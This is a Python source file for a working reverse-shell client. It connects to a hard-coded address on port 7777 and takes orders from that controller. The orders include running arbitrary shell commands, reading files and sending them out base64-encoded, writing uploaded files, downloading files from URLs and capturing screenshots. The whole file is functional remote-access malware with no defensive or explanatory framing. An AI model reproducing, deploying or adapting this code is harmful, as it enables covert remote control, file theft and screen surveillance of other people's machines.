#!/usr/bin/env/python
#_*_coding: utf8_*_
import socket
import os
import subprocess
import base64
import requests
import mss
import os

def download_file_url(url):
    query = requests.get(url)
    fileName= url.split("/")[-1]
    with open(fileName,"wb") as file_downloaded_url:
        file_downloaded_url.write(query.content)

def take_screenshot():
    with mss.mss() as sct:
        screenshot = sct.shot(output="temp_screenshot.png")
        with open("temp_screenshot.png", "rb") as file:
            encoded_screenshot = base64.b64encode(file.read())
    return encoded_screenshot

def shell():
    current_dir = os.getcwd()
    client.send(current_dir.encode())
    while True:
        res= client.recv(10024).decode()
        print(res)
        if res == "exit":
            break
        elif res[:2] == "cd" and len(res)>2:
            try:
                os.chdir(res[3:])
                result = os.getcwd()
            except FileNotFoundError:
                result = f"Error: Directory '{res[3:]}' does not exist."
            except Exception as e:
                result = f"Error: {str(e)}"
            client.send(result.encode())
        elif res[:8] == "download":
            with open(res[9:],"rb") as file_download:
                client.send(base64.b64encode(file_download.read()))
        elif res[:6]=="upload":
            print(f"Recibiendo: {res[:7]}")
            try:
                with open(res[7:],"wb") as file_upload:
                    data = client.recv(300000).decode()
                    file_upload.write(base64.b64decode(data))
            except:
                print("File upload failed")
        elif res[:4]=="wget":
            try:
                print(f"Command to download from internet {res[:4]}")
                download_file_url(res[4:])
                client.send("File downloaded success!".encode())
            except:
                client.send("File error download!".encode())
        elif res[:10]=="screenshot":
            try:
                screenshot_data= take_screenshot()
                client.send(screenshot_data)
                os.remove("temp_screenshot.png")
            except:
                client.send("Screenshoot failed..\n".encode())
        else:
            proc = subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            if len(result)==0:
                client.send("1".encode())
            else:
                client.send(result)

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(('192.168.100.68',7777))
shell()
client.close()
